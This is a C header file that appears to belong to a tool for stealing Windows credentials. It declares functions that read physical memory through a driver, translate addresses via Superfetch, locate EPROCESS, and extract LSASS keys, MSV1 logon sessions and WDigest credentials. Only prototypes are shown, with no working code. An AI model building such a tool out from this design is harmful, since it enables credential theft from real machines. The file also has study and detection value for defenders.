// Privileges
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE 13L

// NTSTATUS
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
#endif

// utils.c
BOOL isServiceInstalled(int provId);
BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue, int provId);
//BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue);
BOOL EnablePrivilege(ULONG priv);
DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalMemory, int provId);
unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards, int provId);
DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress, int provId);
wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID, int provId);
BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize);
DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen);

// superfetch.c
BOOL CreateGlobalSuperfetchDatabase(BOOL use_PF_MEMORYRANGEINFO_V2);
BOOL TranslateV2P(DWORD64 VirtualAddress, DWORD64* PhysicalAddress);
BOOL TranslateUVA2Physical(DWORD64 VirtualAddress, DWORD64* PhysicalAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID);
BOOL TranslateP2V(DWORD64 PhysicalAddress, DWORD64* VirtualAddress);
DWORD64 GetDataSectionBase(DWORD64 ImageStartAddress, DWORD64 ImageEndAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID);

// eprocess.c
DWORD64 GetNtEprocessAddress(HANDLE hFile, int provId);
DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, DWORD dBuildNumber, int provId);

// lsass.c
DWORD64 GetDataSectionOffset(char* TargetModule);
BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials, int provId);

// lsass_getkeys.c
BOOL SearchForCredentialKeys(DWORD dBuildNumber, DWORD64* hAesKeyAddress, DWORD64* h3DesKeyAddress, DWORD64* IVAddress);

// lsass_logonpasswords.c
DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress, DWORD dBuildNumber, int provId);
BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int provId);

// lsass_wdigest.c
DWORD64 SearchForLogSessList(void);
BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int provId);
